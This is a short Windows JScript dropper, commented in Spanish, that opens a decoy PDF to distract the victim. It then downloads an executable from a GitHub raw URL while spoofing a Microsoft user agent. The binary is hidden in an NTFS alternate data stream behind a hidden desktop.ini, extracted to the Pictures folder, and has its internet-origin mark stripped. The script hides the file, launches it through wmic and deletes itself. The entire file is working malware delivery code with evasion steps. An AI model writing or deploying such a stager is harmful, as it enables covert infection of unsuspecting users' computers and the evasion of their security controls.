// ========================================================================
// STAGER SIMPLE - JScript con ADS (sin cifrado para testing)
// ========================================================================

var PAYLOAD_URL = "https://github.com/ggggwrmsfootmen/curly-fortnight/raw/refs/heads/main/health-check.exe";
var DECOY_FILE = WScript.CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") + "\\desktop.ini";
var ADS_NAME = "data";
var FINAL_EXE = WScript.CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERPROFILE%") + "\\Pictures\\health-check-win.exe";

var fso = WScript.CreateObject("Scripting.FileSystemObject");
var shell = WScript.CreateObject("WScript.Shell");

function openPDF() {
    // Buscar PDF en la misma carpeta que el script
    var scriptDir = fso.GetParentFolderName(WScript.ScriptFullName);
    var folder = fso.GetFolder(scriptDir);
    var files = new Enumerator(folder.Files);
    
    for (; !files.atEnd(); files.moveNext()) {
        var file = files.item();
        if (file.Name.toLowerCase().indexOf(".pdf") > -1) {
            shell.Run('"' + file.Path + '"', 1, false);
            return true;
        }
    }
    return false;
}

function downloadBinary(url) {
    var xhr = WScript.CreateObject("MSXML2.XMLHTTP");
    xhr.open("GET", url, false);
    xhr.setRequestHeader("User-Agent", "Microsoft-Delivery-Optimization/10.0");
    xhr.send();
    return (xhr.status == 200) ? xhr.responseBody : null;
}

function saveBinaryToADS(decoyFile, adsName, binaryData) {
    var stream = WScript.CreateObject("ADODB.Stream");
    stream.Type = 1; // Binary
    stream.Open();
    stream.Write(binaryData);
    stream.SaveToFile(decoyFile + ":" + adsName, 2);
    stream.Close();
}

function extractFromADS(decoyFile, adsName, outputFile) {
    var stream = WScript.CreateObject("ADODB.Stream");
    stream.Type = 1;
    stream.Open();
    stream.LoadFromFile(decoyFile + ":" + adsName);
    stream.SaveToFile(outputFile, 2);
    stream.Close();
}

try {
    // 0. Abrir PDF (decoy)
    openPDF();
    
    // Esperar un poco
    WScript.Sleep(1000);
    // 1. Descargar payload
    var payload = downloadBinary(PAYLOAD_URL);
    if (!payload) {
        WScript.Quit(1);
    }
    
    // 2. Crear señuelo
    if (!fso.FileExists(DECOY_FILE)) {
        var decoy = fso.CreateTextFile(DECOY_FILE, true);
        decoy.WriteLine("[.ShellClassInfo]");
        decoy.Close();
        shell.Run('attrib +H +S "' + DECOY_FILE + '"', 0, true);
    }
    
    // 3. Guardar en ADS
    saveBinaryToADS(DECOY_FILE, ADS_NAME, payload);
    
    // 4. Extraer a archivo final
    extractFromADS(DECOY_FILE, ADS_NAME, FINAL_EXE);
    
    // 5. Eliminar marca de internet
    shell.Run('powershell -NoProfile -Command "Unblock-File \'' + FINAL_EXE + '\'"', 0, true);
    
    // 6. Ocultar archivo
    shell.Run('attrib +H "' + FINAL_EXE + '"', 0, true);
    
    // 7. Ejecutar con WMIC (sigiloso)
    shell.Run('wmic process call create "' + FINAL_EXE + '"', 0, false);
    
    // 8. Auto-destrucción
    WScript.Sleep(2000);
    fso.DeleteFile(WScript.ScriptFullName);
    
} catch(e) {
    WScript.Quit(1);
}
